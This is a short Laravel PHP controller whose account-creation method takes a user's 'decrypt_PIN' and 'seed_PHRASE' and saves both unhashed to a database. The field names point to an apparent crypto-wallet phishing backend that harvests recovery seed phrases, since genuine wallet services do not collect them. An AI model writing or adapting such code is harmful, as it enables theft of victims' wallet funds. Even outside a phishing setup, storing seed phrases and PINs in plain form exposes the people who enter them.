<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\ikeepuser;
use Inertia\Inertia;

class UserController extends Controller
{
    public function CreateUserAccount(Request $request)
    {
        $validateData = $request->validate([
                'decrypt_PIN' => 'required',
                'seed_PHRASE' => 'required',
            ]
            );
        
        ikeepuser::create($validateData);

        //return Inertia::render('Account');
        return 'success';
    }
}
